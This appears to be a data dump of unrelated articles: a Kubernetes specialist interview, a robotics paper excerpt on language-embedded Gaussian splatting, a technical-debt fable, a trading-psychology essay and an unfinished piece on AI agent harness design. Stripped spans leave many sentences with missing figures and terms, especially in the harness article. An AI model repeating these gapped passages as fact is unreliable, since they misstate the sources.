summit of the international AITEX experts association, where specialists in business analytics, IT products, and IT infrastructure operations will present their projects.</p><p>Another role that I found very interesting was that of technical proofreader/reviewer for Packt and Manning publishing houses. The opportunity to work with world‑class publishers and contribute to the industry, as well as the high level of responsibility, were very appealing to me. Technical proofreaders work at the manuscript‑writing stage and must have expertise on par with or higher than the authors to guarantee the quality of the final product. For example, on the Packt book (Learn OpenShift, Second Edition), I worked closely with the authors, corrected a number of critical errors in the instructions that could have led to system failure if readers applied them in a real environment, and contributed valuable recommendations from my own experience. For the Manning book (Acing the Certified Kubernetes Exam, Second Edition), I developed my own way of solving a problem that affected a critical Kubernetes subsystem. Both the authors and the publishers themselves noted how critical my expertise in Kubernetes and OpenShift was for these projects.</p><p>Last but not least, I’ve also published a number of scientific articles on quality assurance, DevOps, and cloud technologies, with the most recent one being about ensuring quality and resilience of applications using Kubernetes with another article on the way.</p><p>\\\n<strong>But projects of this caliber are extremely rare at the national scale. Would it be fair to say that reaching your level of expertise is unthinkable without experience at giants like Rutube and Sber?</strong></p><p>Absolutely. There are many courses on the market these days that promise to turn you into a top‑class specialist in a few months, and there are also a ton of free learning materials online. However, even flawless theoretical knowledge plus launching products in a “sandbox” will not expose you to the problems and tasks that arise on large projects. For example, building a CI/CD pipeline in an organization on Sber’s scale implies integrating with many other services, writing automated tests for numerous different subsystems, and implementing a mechanism to pause the pipeline before release until a proper peer review is conducted and approval is obtained from release managers. Therefore, unfortunately, it’s not uncommon in hiring to see a paradoxical situation where the business is looking for a specialist with skills that can only be acquired on a project of a similar scale - of which there are indeed very few.</p><p>\\\n<strong>After reading this article and being inspired by your achievements, our readers will surely want to know how they can get into similar engagements. Is it actually possible to get there “from the street,” through the standard hiring process?</strong></p><p>Very unlikely I’m afraid. Businesses with projects of this complexity seek only highly qualified specialists who have already proven themselves as top experts in the field. This is mainly due to the very high level of responsibility and the cost of mistakes - both financial and reputational - that such projects entail. So at the beginning you will have to prove your qualifications and readiness for tasks at this level. A good option is to join an outstaffing company, where you will have the opportunity to quickly build up the necessary skills and apply them on several projects; after that your chances of getting aboard a national‑level project increase. In addition to technical growth, it’s also important not to forget about so‑called soft skills: the ability to work in a team, communicate information to non‑technical staff (especially those who make strategic decisions), and build useful relationships. Many people overlook this valuable skill. I owe a significant part of my success precisely to my ability to establish rapport with very different people and involve them in solving work tasks.</p><p>\\\n<strong>Judging by your projects, your skills go far beyond those of a typical QA specialist. How did you manage to build such a unique set of competencies?</strong></p><p>Great question! From the very beginning of my career in IT, I realized that it’s impossible to become a true professional if you focus only on your narrow set of responsibilities. Given the national scale and complexity of the projects I’ve been involved in, I had to work with a large number of very diverse products and tools. As my knowledge and experience with Docker and Kubernetes grew, I began to realize the need to organize and systematize all that information. Certification was a logical way to do that and it would also allow me to stand out from others, which is important for recognition in the field. There was also an element of challenge - I wanted to prove to myself that I was capable of meeting all the requirements of the program and obtaining the corresponding status.</p><p>Kubernetes is not only the market-leading orchestrator of containerized applications, but a whole ecosystem of tools that extend its capabilities. The development and oversight of this ecosystem is handled by the Cloud Native Computing Foundation (CNCF), which in turn is a non-profit subsidiary of the Linux Foundation. The latter has its own certification program, including more than 10 certificates in technologies such as Linux, Kubernetes, Prometheus, Cilium, and Istio. I chose the Kubernetes exams specifically because of their hands-on orientation (each exam is a set of complex tasks in a virtual environment, not just questions) and vendor-agnostic nature. In the Kubernetes world there are a number of companies that sell their solutions based on Kubernetes with their own specifics - for example, Red Hat OpenShift Container Platform, VMware Tanzu Kubernetes Grid Integrated Edition, and Amazon Elastic Kubernetes Service (EKS). My goal was to obtain certificates in the core technology so that I could qualify for any projects where it is used in one form or another.</p><p>\\\n<strong>Sounds quite impressive. Could you tell us more about the process itself? How difficult were the exams?</strong></p><p>Any ambitious undertaking requires proper planning and discipline. The Kubernetes certification program consists of five exams that test your ability to solve tasks related to platform administration, application deployment, and security at various levels. At the time of me taking the exams, one of them had undergone an extensive update, which increased its difficulty to the point that achieving a passing score within allotted time became simply impossible for many without practical experience with specific Kubernetes components - this was noted by all candidates in online discussions.</p><p>Nevertheless, I passed all the exams successfully and on the first attempt, thanks to my unique expertise built on nationwide projects. This earned me the Kubestronaut status in September 2025, which is awarded upon successful completion of all five exams in Kubernetes and related technologies. As of today, there are about 3,000 holders of this status worldwide, of which only three are in Russia, including me. I should note that even after obtaining the long‑awaited certificate, I had to challenge CNCF’s initial refusal to place me on the website and map listing all holders and their locations, which was related to the political situation around Russia. But my efforts paid off, and in the end I was listed first. I’d like to extend special thanks to Catherine Paganini and Nancy Chauhan, CNCF ambassadors who helped me develop an appeal strategy.</p><p>\\\n<strong>Thank you, Iuliia! It was very interesting to hear about such an unusual path first‑hand from such a high‑level professional. Your experience will definitely be of interest to our readers.</strong></p>",

      "content": "<p>We consider a large indoor environment, specifically defined as a room encompassing at least 750 sq ft. The objective is to 3D reconstruct the a-priori unknown and unstructured environment and localize objects prompted by open-vocabulary and long-tail natural-language queries. We make the following assumptions:</p><ol><li><p>The environment and all objects within it are static.</p></li><li><p>Queried objects are seen at least from one of the cameras.</p></li><li><p>A mobile robot with 3 orthogonal cameras.</p><p>For the grocery store environment, the TTT robot with a single pair of stereo cameras is used [15]. For each trial, the system is prompted by a natural-language query, and outputs the heatmap and localized 3D coordinate of the most semantically relevant location in the scene. The trial is deemed successful if this point falls within a manually annotated bounding box for that object. The objective is to efficiently build a 3D representation that maximizes this success rate for large-scale scenes.</p></li></ol><p>We use a Fetch mobile robot equipped with an RGB-D Realsense D455 camera and two side facing ZED 2 stereo cameras mounted with known relative poses. We build a map of the scene with a set of 3D Gaussians in an online fashion, registering new images as the robot drives around the environment. The overall pipeline for LEGS is outlined in Figure 2. </p><p>There are three key components of the system:</p><ol><li><p><strong>Multi-Camera Reconstruction:</strong> To improve the effective field-of-view of the robotic system, we use multiple cameras pointing in different directions to provide more viewpoints of the environment.</p></li><li><p><strong>Incremental 3DGS Construction:</strong> A significant challenge of large scene mapping is localization error due to its accumulative nature. To mitigate this error, we perform global Bundle Adjustment (BA) with DROIDSLAM to improve pose accuracy for all previously recorded poses in the scene. Global BA can be executed multiple times in a given traversal, and after each BA, the prior image-pose estimates are updated with the corresponding pose.</p></li><li><p><strong>Language-Embedded Gaussian Splatting:</strong> We implement a language-aligned feature field inspired by the method from LERF [1] that samples from gaussian primitives instead of from a density field.</p></li></ol><p>A. <em>Multi-Camera Reconstruction</em></p><p>Online image registration enables Gaussian Splatting on a mobile base with a comprehensive sensor suite including multiple camera views (left, right, center). During testing of vanilla Gaussian Splatting on our multi-camera setup, we found that offline Structure from Motion (SfM) pipelines frequently failed to find correspondences between images from different cameras, largely due to the lack of scene overlap from offset camera views. Because we peform online image registration with a visual SLAM algorithm for one camera and we know the corresponding extrinsic transforms to the other cameras, we can compute the corresponding pose estimate for each camera. Due to limited GPU memory onboard the Fetch robot, the image data is then streamed over network to a desktop computer for processing and training.</p><p>\\\n<em>B. Incremental 3DGS Construction + Bundle Adjustment</em></p><p>Standard methods for radiance field optimization require image-pose pairs as input, and Gaussian Splatting greatly benefits from having a pointcloud as a geometric prior for initialization. Poses and pointclouds are typically provided through offline Structure from Motion (SfM) techniques like COLMAP [51] which require all training images to be collected ahead of time. We build off of Nerfstudio’s [52] Splatfacto implementation of Gaussian Splatting and modify it to operate on a stream of images and poses, and incorporate updates from global bundle adjustment (BA) to further optimize poses by building a keyframe graph to minimize the Mahalanobis distance between the reprojected points and the corresponding revised optical flow points [53].</p><ol><li>Online Optimization: For online pose estimation we use DROID-SLAM [53], a monocular SLAM method that takes in monocular, stereo, or RGB-D ordered images and outputs per-keyframe pose estimates and disparity maps. During operation, we feed DROID-SLAM input frames from one of the side-facing Zed cameras, and extrapolate the poses of other cameras using the camera mount CAD model. Registered RGBD keyframes from DROID-SLAM are incrementally added to Splatfacto’s training set. We initialize new Gaussian means per-image by sampling 500 pixels from each depth image and deproject them into 3D using the corresponding metric depth measurement. We use a learned stereo depth model trained on synthetic images [54], which can predict thin features and transparent objects with high accuracy.</li><li>Global Bundle Adjustment: Incorporating images with pose drift from SLAM systems results in artifacts in 3DGS models like duplicated or fused objects, fuzzy geometry, and ghosting (Fig. 4). Though prior work has demonstrated that pose optimization inside a 3DGS can track camera pose [44], tracking iterations for the method with reported results takes up to a second to perform, making it difficult for online usage. Instead, to mitigate drift, we incorporate updates from global BA and update training camera poses in the 3DGS accordingly. This allows tracking of new camera frames at 30fps in tandem with continual 3DGS optimization for faster model convergence.</li></ol><p>\\\n<em>C. Language Embedded Gaussian Splats</em></p><p>In Language Embedded Radiance Fields (LERF) [1] the language field is optimized by volumetrically rendering and supervising CLIP embeddings along rays during training. In contrast, 3DGS provides direct access to explicit gaussian means, allowing us to implement a multi-scale language</p><p>\\\nembedding function, Flang(⃗x,s) ∈ R D. This function takes an input position ⃗x and physical scale s, outputting a Ddimensional language embedding. Flang is implemented by passing a sampled ⃗x through a multi-resolution hash encoding [19], which produces the input z to the MLP mθ (z,s), with the MLP evaluated last resulting in feature output y ∈ R D. These features can then be projected and rasterized into feature images using Nerfstudio’s [52] tile-based rasterizer implementation, with loss gradients backpropagated through the MLP. Hash encoding employs a hash table to store feature vectors corresponding to grid cells in a multi-resolution fashion. This hash grid encoding scheme effectively reduces the number of floating-point operations and memory accesses needed during training and inference, compared to directly feeding position features into an MLP.</p><p>\\\nLanguage-aligned features are obtained from the training images using multi-scale crops passed through the CLIP encoder, a technique shown in LERF to be crucial for semantic understanding in large scenes where object sizes may vary drastically. This is in contrast to prior work which averages CLIP embeddings as a tradeoff between speed and accuracy [17]. LEGS facilitates inference at approximately 50 Hz 1080p, and its hybrid explicit-implicit representation allows faster scene querying without volumetric rendering. Given a natural language query, we query the language field to obtain a relevancy map similar to LERF. To localize the query in the world frame, we find the relevancy over CLIP features and take the argmax relevancy over 3D gaussian means. This method offers a significant speed increase over feature field methods distilled in NeRFs, where the volumetric representation must first render a dense pointcloud.</p><ol><li>Thomas Kollar&nbsp;Ken Goldberg</li></ol><p>:::info\nThis paper is  under CC by 4.0 Deed (Attribution 4.0 International) license.</p>",

      "content": "<p><strong><em>By Doug Needham, DataOps.live</em></strong></p><p>Technical debt is a challenge for any digital team. Suggestions to avoid it get overridden or ignored, and it’s a rare treat to get to fix the things we know need fixing. If only our PMs and  understood what we know—how terrifying technical debt really is—maybe they’d push back less when we fight to build things the right way.&nbsp;</p><p>I think I’ve found the way to tell them.</p><p>Fairy tales, parables, and stories our grandparents tell may not be factual, but they are “true.” They hold a kernel of truth that we remember when the time is right. The following tale I tell in that same spirit.&nbsp;</p><p><em>You wanted your car built in a hurry, and here it is — oh, but twelve bolts were left over after we put it together.</em></p><p><em>The project managers have insisted that these particular bolts can wait for the next maintenance window.</em></p><p><em>The sales team assures you these bolts are not necessary.</em></p><p><em>The engineering team knows what these bolts will hold together. They recommend taking the time to apply the bolts.</em></p><p><em>The race will begin soon.</em></p><p><em>You will be making life-or-death decisions at breakneck speeds on a racetrack designed for demonstrating your car's capabilities.</em></p><p><em>There are thirty-nine other cars on the starting line, each with their own engineering, sales, and project management teams.</em></p><p><em>Do they have all of the parts of their cars held together?</em></p><p><em>Which parts of your car are not held together in the best way possible?</em></p><p><em>By using this car and pushing it to the limit, will you win the race, or end up a puddle on turn 3?</em></p><p>This is technical debt: a high-risk situation that could have easily been avoided by listening to the experts.&nbsp;</p><p>If you need a quicker analogy, it’s like Russian roulette, only you do not know the number of chambers, the caliber of the bullet, how many bullets are loaded, or which way the gun is facing.&nbsp;</p><p>Non-technical stakeholders sometimes confuse refactoring for technical debt. It is certainly true that there are times when architects and engineers learn better ways to build something after it’s been built. This is not technical debt. This is version efficiency.&nbsp;</p><p>In either case, those people actually doing the implementations should be able to decide what needs to be done. Having non-technical users make technical decisions about how to build a tool is a recipe for disaster.&nbsp;</p><p>When your PM or data owner asks you to cut corners, remind them of this story. Ask, “Do you trust your crew to make the right decisions?&nbsp;</p><p>Users don’t understand the risks when they tell us to cut corners. They don’t know the importance of the right driver, structured SQL, updating the subroutines, adding a node to the cluster, or updating to the current patch level and getting a clean reboot.&nbsp;</p><p>They may understand driving a car they wanted built. You built them a wonderful car, but they dictated a few shortcuts that you knew needed to be fixed later, only later never came.&nbsp;</p><p>Since we do know the risks of technical debt, we have a responsibility to raise the alarm. Tell them the story of the race. Remind them that they are sitting in that car. They are the ones who told you not to fix the thing you know needed fixing.&nbsp;</p><p>I hope this story becomes an arrow in your quiver when a business user or project manager tries to overrule you architects and engineers who know something needs to be done, and it needs to be done the right way. Share this story widely, and let me know if it helps convey your message.&nbsp;</p><p>Technical debt is something we all live with. Choosing the tools we use to mitigate technical debt risk is a decision still in our hands. A tool like  provides a codified architecture that ensures  by a deterministic set of rules. You can stand on the shoulders of this team and rest easy at night, or take turn 3 at full speed!</p>",

The redesigned interface brings up a contextual menu surrounding a user's finger when they touch a button or control, and enlarges menu bar items when tapped, adapting the available controls based on whether the input is touch or click. \n\nApple does not plan to position the machines as iPad replacements or describe them as touch-first; the physical design retains the full keyboard and large trackpad of the current MacBook Pro. Last year's Liquid Glass redesign in macOS Tahoe, which added more padding around icons and touch-optimized sliders in the control center, was partly groundwork for this shift.",

      "content": "<p>The sharper the mind, the more elaborate the justification for staying wrong. Depth of thought becomes the mechanism of loss when it serves identity instead of truth.</p><p>There is a version of intelligence that protects you in markets. It reads conditions, adjusts frameworks, and knows when to step aside. Then there is another version, far more common, that does the opposite. It builds elaborate cases for positions that should have been closed days ago.</p><p>The distinction matters more than most traders realize. Because the second version does not feel like a problem. It feels like depth.</p><h2>Pattern Recognition Is Not Understanding</h2><p>A trader who has performed well in one regime starts to confuse two things that look identical from the inside but are fundamentally different. Pattern recognition and genuine understanding.</p><p>The patterns worked. The profits confirmed the framework. So the framework hardens into something more than a tool. It becomes identity. And identity has a very specific property in markets: it resists correction far longer than simple ignorance ever could.</p><p>Someone with less information might exit a losing trade out of raw discomfort. The gut says something is wrong, and because there is no intellectual scaffolding to override that signal, they act on it. They leave. They survive.</p><p>Someone with more information finds a reason to stay. They know about mean reversion. They know about false breakdowns. They know about shakeouts before continuation. Every piece of knowledge they have accumulated becomes a tool, not for seeing clearly, but for staying wrong with greater sophistication.</p><p>There is a difference between thinking clearly and thinking thoroughly. Most traders assume they are the same thing. They are not.</p><p>Thorough thinking without emotional awareness just builds a more convincing case for whatever the body already decided. The position felt right before the analysis began. The analysis followed, not as discovery, but as defense. The conclusion was fixed. Only the arguments were flexible.</p><p>This is why the most expensive trades are rarely the impulsive ones. Impulsive trades get stopped out quickly. They sting, but they end. The truly costly positions are the ones held through every warning sign, every deteriorating signal, every shift in regime, because the holder had a better story than the market did.</p><p>And for a while, a better story feels like a better position. Until it does not.</p><p>What makes this so difficult to address is that the same quality of mind that produces edge in stable conditions becomes the mechanism of loss when conditions shift.</p><p>The asset changed. The regime changed. The correlations broke. But the thinker did not change, because changing would mean admitting the framework had limits. And frameworks with limits feel less safe than frameworks held with conviction. So the trader doubles down, not on the position necessarily, but on the worldview that produced it.</p><p>This is not stupidity. It is the opposite. It is intelligence recruited in service of emotional comfort. The smarter the trader, the more tools they have for constructing the case. The more tools they have, the longer they can delay the reckoning. The longer they delay, the larger the eventual cost.</p><p>Somewhere between confidence and rigidity, there is a line. Almost no one notices while they are crossing it.</p><p>On one side, you hold a view because the evidence supports it and you are prepared to update when the evidence shifts. On the other side, you hold a view because it has become part of how you see yourself, and updating it would feel like loss. Not financial loss. Something deeper.</p><p>The only reliable defense is not more intelligence. It is the habit of asking a question that intelligence alone will never prompt: what would it take for me to be wrong here, and would I actually accept that evidence if it appeared?</p><p>Most traders, if they are honest, already know the answer.</p>",

      "content": "<p>\\\nI keep hearing the same question at every engineering offsite, Slack thread, and investor pitch:&nbsp;<em>“What’s the best model right now — GPT, Claude, or Gemini?”</em>&nbsp;I spent the last several months building and debugging agent-based systems, and I think this is the wrong question entirely. The evidence is now overwhelming:&nbsp;<strong>what determines whether an AI agent succeeds in production is not the model underneath it, but the infrastructure wrapped around it</strong>.</p><p>I am going to lay out my hypothesis, test it against three independent case studies with published data, and show you exactly where the industry is converging. Every claim in this article is backed by a published source — engineering blogs, peer-reviewed papers, or reporting from outlets with direct access.</p><p>My hypothesis:&nbsp;<strong>Agent harness engineering</strong>&nbsp;— the design of context management, tool selection, error recovery, and state persistence — is the primary determinant of agent reliability, not model capability. Past a capability threshold, improving the harness yields better returns than swapping the model.</p><ul><li>The APEX-Agents benchmark tested frontier models on real professional tasks (banking, consulting, law). Best pass@1: 24.0%. Pass@8: ~40%. Failures are primarily orchestration problems, not knowledge gaps [1].</li><li>Vercel removed 80% of their agent’s tools (15 down to 2). On a 5-query benchmark, accuracy jumped from 80% to 100%, tokens dropped 37%, speed improved 3.5x. Small sample, but the direction is striking [2].</li><li>Manus rebuilt their agent framework four times, and the biggest gains came from&nbsp;&nbsp;user-facing complexity while adding targeted infrastructure (context compaction, logit masking). They average ~50 tool calls per task and use the filesystem as external memory [3].</li><li>OpenAI, Anthropic, and Manus (acquired by Meta in late 2025 [9][19]) all independently converged on the same insight: simpler harnesses plus better models beat complex orchestration [4][5][6].</li><li>Verdict: The hypothesis holds with one important qualification — it applies above a model capability floor. Below that floor, no harness compensates for insufficient reasoning. Above it, harness engineering dominates outcome</li></ul><p>Before going further, let me define what I mean by&nbsp;. OpenAI recently published a blog post explicitly titled “Harness Engineering” [4], and Martin Fowler published an analysis of the concept [7]. The term is gaining traction, but here is a precise technical definition:</p><p>An agent harness is the infrastructure layer that wraps a foundation model and controls five things:</p><ol><li>&nbsp;— what enters the model’s context window, in what order, and what gets evicted</li><li>&nbsp;— which capabilities the model can invoke, and how those interfaces are designed</li><li>&nbsp;— how the system handles failed tool calls, reasoning dead-ends, and retry logic</li><li>&nbsp;— how the agent persists progress across turns, sessions, and context window boundaries</li><li>&nbsp;— how information is stored and retrieved beyond the context window</li></ol><p>Think of the model as the engine and the harness as the car. The industry has spent years arguing about who has the best engine. Almost nobody has been building a car that can stay on the road.</p><h2>2. The Benchmark That Broke the Illusion</h2><p>The disconnect between benchmark scores and real-world performance has been a running joke in the industry. Models score above 90% on coding puzzles and multiple-choice tests, then fail at the kind of work an analyst does on a Tuesday morning.</p><p>In January 2026, Mercor published&nbsp;&nbsp;[1], a benchmark that does something different: it tests agents on real professional work. Not coding puzzles. Not trivia. The actual tasks that investment banking analysts, management consultants, and corporate lawyers perform — the kind of work that takes a human 1–2 hours and involves navigating documents, spreadsheets, PDFs, email, and calendars across multi-day engagements.</p><p>The benchmark consists of&nbsp;&nbsp;across&nbsp;&nbsp;— 10 banking, 11 consulting, 12 legal — each simulating a 5–10 day client engagement with an average of&nbsp;&nbsp;per world.</p><p>With&nbsp;&nbsp;(pass@8), the best model climbed to only&nbsp;. Depending on the agent configuration, zero-score rates — where the agent failed every rubric criterion — ranged from&nbsp;&nbsp;to&nbsp;&nbsp;across tested configurations. Timeout rates (exceeding 250 steps) reached up to&nbsp;&nbsp;for some models.</p><p>These numbers come from the APEX-Agents evaluation framework (“Archipelago”), which runs each agent in a sandboxed environment with standardized tool access, a 250-step limit, and rubric-based scoring by domain experts. Pass@1 reflects a single attempt; pass@8 takes the best of eight independent runs. The scores above represent best-case results across tested configurations — individual harness setups produced significant variance.</p><p>The critical finding: these failures were predominantly not knowledge failures. The models had the information and could reason through the problems in isolation. The failures were&nbsp;<strong>execution and orchestration</strong>&nbsp;problems — agents getting lost after too many steps, looping back to failed approaches, and losing track of their objectives mid-task.</p><p>This is exactly the failure pattern that harness engineering addresses: context management (losing track), error recovery (looping on failures), and state management (forgetting objectives).</p><p>This case study is the one that challenged my own intuitions most directly.</p><p>Vercel had a text-to-SQL agent called d0. The architecture was standard and, honestly, was what I would have built: specialized tools for every stage of the pipeline [2].</p><pre><code>GetEntityJoins    LoadCatalog      RecallContext\nLoadEntityDetails SearchCatalog    ClarifyIntent\nSearchSchema      GenerateAnalysisPlan\nFinalizeQueryPlan FinalizeNoData   JoinPathFinder\nSyntaxValidator   FinalizeBuild    ExecuteSQL\nFormatResults\n</code></pre><p>Each tool had structured inputs, validation, error handling, and prompt engineering around it. This is how most teams build agents — the instinct is to constrain the model, mediate its interactions, and provide specialized interfaces for every operation.</p><blockquote><p>It worked 80% of the time (4/5 on their benchmark).</p></blockquote><p>Then they did something radical: they deleted most of it. The new agent has exactly two tools:</p><ol><li>&nbsp;— bash access in a Vercel Sandbox</li><li>&nbsp;— direct query execution</li></ol><p>The agent now uses&nbsp;,&nbsp;,&nbsp;, and&nbsp;&nbsp;to explore YAML, Markdown, and JSON files representing the Cube semantic layer. Standard Unix utilities that every developer already knows.</p><p>The worst case under the old system:&nbsp;,&nbsp;,&nbsp;, and it still failed. The filesystem agent completed the same query in&nbsp;&nbsp;using&nbsp;&nbsp;across&nbsp;&nbsp;— successfully.</p><p>The model they used: Claude Opus 4.5, running inside a Vercel Sandbox with access to the Vercel AI Gateway.</p><p>Vercel’s team published an open-source tool (bash-tool) and a companion post on building agents with filesystems and bash [8]. Their conclusion:&nbsp;<em>“The best agents might be the ones with the fewest tools.”</em></p><p>The insight is not that tools are bad. It is that&nbsp;<strong>specialized tools become bottlenecks when the model is already capable enough</strong>&nbsp;to use general-purpose interfaces.

With 15 tools, the model spends more tokens&nbsp;&nbsp;than&nbsp;.</p><p>General-purpose tools (bash, file access) map directly to how models are trained.

Manus: Four Rebuilds and a $2B Lesson</h2><p>Manus went viral in early 2025 as a general-purpose AI agent. Then they did something most companies avoid: they published their mistakes. In their blog post “Context Engineering for AI Agents” [3], Yichao “Peak” Ji detailed how they rebuilt their framework four times, each time discovering a better approach to context management.</p><p>In December 2025, Meta acquired Manus for a reported ~$2 billion according to CNBC and TechCrunch [9][19] — validation that the harness architecture they built had significant production value beyond the underlying model.</p><p>Each rebuild followed a pattern: removing user-facing complexity that seemed necessary but was degrading performance, while investing in targeted internal infrastructure (compaction, caching, logit masking) that improved the model’s operating environment.</p><ul><li>A complex document retrieval system — replaced by direct file access</li><li>Fancy routing logic between specialized sub-agents — replaced by structured handoffs</li><li>Specialized tools for each operation — replaced by general-purpose shell execution</li></ul><h3>What They Kept and Refined</h3><p>Filesystem-as-memory: Instead of stuffing everything into the context window, the agent writes key information to files and reads it when needed. As they describe it, files are&nbsp;<em>“unlimited in size, persistent by nature, and directly operable by the agent”</em>&nbsp;[3].</p><p>Todo-list mechanism: The agent maintains a persistent progress file, reciting its objectives at the end of the context to combat the “lost-in-the-middle” attention degradation [10].</p><p>Context compaction: With an input-to-output ratio of approximately 100:1, they implemented a compaction hierarchy:</p><ol><li>&nbsp;(preferred) — full tool output</li><li>&nbsp;— swap full results for compressed versions while preserving restoration paths (URLs, file paths)</li><li>&nbsp;(last resort) — only when compaction no longer yields sufficient space</li></ol><p>: By maintaining stable prompt prefixes, append-only contexts, and deterministic serialization, they achieved 10x cost savings on cached tokens ($0.30/MTok vs $3/MTok uncached with Claude Sonnet) [3].</p><p>Tool management via logits masking: Rather than dynamically adding and removing tools from the prompt, they use a context-aware state machine that constrains tool selection through logit-level masking. Three modes: Auto (model chooses), Required (unconstrained), Specified (subset selection via prefilling).</p><p>Their agents average approximately 50 tool calls per task. Even with large context windows (200k+ tokens), performance degraded past a threshold — not because the model “forgot” earlier content, but because the signal-to-noise ratio in the context window collapsed. Important instructions at the beginning get buried under hundreds of intermediate tool results.</p><p>This aligns with the “Lost in the Middle” research by Liu et al. [10], which demonstrated that LLMs exhibit a U-shaped attention pattern — they attend strongly to the beginning and end of context but poorly to the middle. Greg Kamradt’s “Needle in a Haystack” tests [11] confirmed this empirically across multiple frontier models.</p><h2>5. Three Architectures, One Convergence</h2><p>The three most production-tested agent harnesses right now are OpenAI Codex, Claude Code, and Manus. They were built independently by different teams with different philosophies. They converged on the same core insight.</p><h3>OpenAI Codex: Harness Engineering as a Discipline</h3><p>OpenAI published “Harness Engineering” [4] and “Unlocking the Codex Harness” [12] — describing how a small team built and shipped a million-line production system in five months using Codex agents. Per their blog, the engineers wrote no source code directly; they shifted from writing code to designing harness environments, specifying intent, and reviewing agent-generated pull requests.</p><p>Their architecture enforces a strict layered dependency model:</p><p>Code can only depend&nbsp;&nbsp;through these layers. Cross-cutting concerns (auth, connectors, telemetry, feature flags) enter through a single explicit interface:&nbsp;. This is classical layered architecture applied to agent-generated code — the harness enforces constraints that keep the agent productive.</p><p>Anthropic’s approach with Claude Code is deliberately minimal. The core tool set centers on:</p><ul></ul><p>Most of the intelligence lives in the model. Extensibility comes through MCP (Model Context Protocol) [13] — an open protocol for connecting Claude to external tool servers — and project-level instructions via&nbsp;&nbsp;files.</p><p>Anthropic published a companion guide on “Effective Harnesses for Long-Running Agents” [5], recommending a two-agent pattern:</p><ol><li>&nbsp;— sets up the environment on first run (init.sh, progress file, feature tracking)</li><li>&nbsp;— handles incremental work, reading progress files at session start</li></ol><p>Their key state management artifacts: an&nbsp;&nbsp;script for reproducible environments, a&nbsp;&nbsp;file for work logging, and git for version control and rollback. The constraint:&nbsp;<em>one feature per session, incremental progress, leave code in a mergeable state</em>.</p><h3>Manus: Reduce, Offload, Isolate</h3><p>Manus’s approach can be summarized in three words:</p><ol><li><p>&nbsp;— aggressively shrink context through compaction and eviction</p></li><li><p>&nbsp;— use the filesystem for persistent memory beyond the context window</p></li><li><p>&nbsp;— delegate heavy sub-tasks to sub-agents and pull back summaries</p></li></ol><p>Three independent architectures. Same direction:</p><h2>6. The Bitter Lesson, Applied</h2><p>Richard Sutton’s “The Bitter Lesson” [14], published in March 2019, is one of the most cited essays in modern AI. The core argument:&nbsp;<em>“The biggest lesson that can be read from 70 years of AI research is that general methods that leverage computation are ultimately the most effective, and by a large margin.”</em></p><p>Sutton was writing about search and learning methods. But the pattern maps directly to agent harnesses:</p><p>Every Vercel tool that was removed, every Manus retrieval system that was deleted, every routing layer that was replaced with a simple handoff — these are instances of the Bitter Lesson playing out in real time.</p><p>I want to be honest about a tension here. A strict reading of Sutton’s argument would predict that harness engineering itself will eventually be obsoleted by sufficiently capable models — that we should just scale models until they handle long-horizon tasks end-to-end without orchestration scaffolding. That counterargument is real and I take it seriously. Manus had to rebuild their harness four times as models evolved, which is itself evidence that model improvements erode harness value.</p><p>My position is that multi-step execution tasks have irreducible coordination requirements — context management, state persistence, error recovery — that are not reasoning problems for the model to solve but infrastructure problems for the system to handle. A model does not need to be “smarter” to save its progress to disk; it needs a harness that persists state. The harness is itself a general method: it manages context and recovers from errors in ways that scale with model capability. The key distinction is that the harness should get&nbsp;&nbsp;as models improve, not more complex.</p><p>The practical implication: if every model upgrade makes you add more hand-coded logic, routing, or pipeline steps, you are swimming against the current. Build for deletion. Every piece of harness logic should be something you can remove when the model no longer needs it. If your infrastructure keeps getting more complicated as models improve, you are over-engineering.</p><p>This is not a theoretical argument. Anthropic’s “Building Effective Agents” guide [6] explicitly recommends starting with simple patterns (augmented LLM, prompt chaining) before reaching for complex agent frameworks. LangChain’s evolution from heavily-abstracted chains (v0.1–0.2) to the simpler graph-based composition of LangGraph [15] is another instance of this pattern. The industry is learning the Bitter Lesson in real time.</p><p>In early smartphones, the processor was the story — faster chips meant better phones. Eventually processors crossed a sufficiency threshold and the difference stopped mattering to users. Differentiation moved to the operating system (iOS vs. Android), the camera software (computational photography, not the sensor), and the developer ecosystem.</p><p>Raw compute power became a commodity. Value moved to the infrastructure layer.</p><p>The same pattern played out in cloud computing: server hardware commoditized, and value moved to AWS’s infrastructure abstractions. In databases: raw storage commoditized, and value moved to query optimization and transaction management. In GPUs: raw FLOPS commoditized across NVIDIA SKUs, and value moved to the CUDA/cuDNN/PyTorch software stack.</p><p>In the agent era, the harness is the operating system. The teams and companies that build great harnesses will maintain their advantage as the underlying models keep changing. This is why OpenAI built Codex as a harness product, not just a model. This is why Meta reportedly paid ~$2 billion for Manus’s harness [9][19], not a foundation model.</p><h2>7. Production Engineering Realities</h2><p>The case studies above are compelling, but they focus on capability. Production systems must also address reliability, observability, cost, and security. These are harness concerns that the published literature often underemphasizes.</p><p>This is not a new insight in ML systems. Sculley et al.’s “Hidden Technical Debt in Machine Learning Systems” [16] demonstrated in 2015 that ML model code is a small fraction of a production ML system — the surrounding infrastructure dominates. Agent harnesses are the latest manifestation of the same pattern.</p><p>Context is not free. As of mid-2025, Claude Sonnet uncached input tokens cost $3/MTok. Manus’s approximately 100:1 input-to-output ratio means context management directly determines cost. Their KV-cache optimization (stable prefixes, append-only context, deterministic serialization) cuts this to $0.30/MTok for cached tokens [3]. That is a 10x cost reduction from a pure harness optimization, with zero model changes. (Pricing is time-sensitive — verify current rates before applying these figures to your own cost models.)</p><p>For a system averaging 50 tool calls per task, naive context management can easily push a single task to 200k+ tokens. At $3/MTok uncached, that is $0.60 per task. At $0.30/MTok cached, it is $0.06. Across millions of tasks, this is the difference between a viable product and an unsustainable cost structure.</p><p>From the APEX-Agents analysis, the Manus blog post, and Anthropic’s harness guide, a consistent taxonomy of agent failure modes emerges — and every failure mode is a harness problem:</p><p>One production tradeoff of the “fewer tools” approach: specialized tools produce structured telemetry (tool=search_code, query=X, results=N, latency=Yms). Bash commands produce unstructured output that requires parsing to extract equivalent signals.</p><p>Production harnesses need a structured logging layer regardless of tool design:</p><ul><li>Per-tool-call telemetry: tool name, input hash, output size, latency, success/failure</li><li>Context utilization tracking: tokens used vs budget, cache hit rate, compaction events</li><li>Task-level metrics: total steps, total tokens, wall-clock time, outcome</li><li>Distributed tracing: OpenTelemetry spans across multi-turn agent workflows</li></ul><p>The “give it bash” approach has an obvious security surface. Vercel addresses this with sandboxed execution (Vercel Sandbox). Manus uses full VM isolation. Claude Code runs locally with user-controlled permissions.</p><p>For production deployments:</p><ul><li>Sandbox everything: Shell access without isolation is a vulnerability, not a 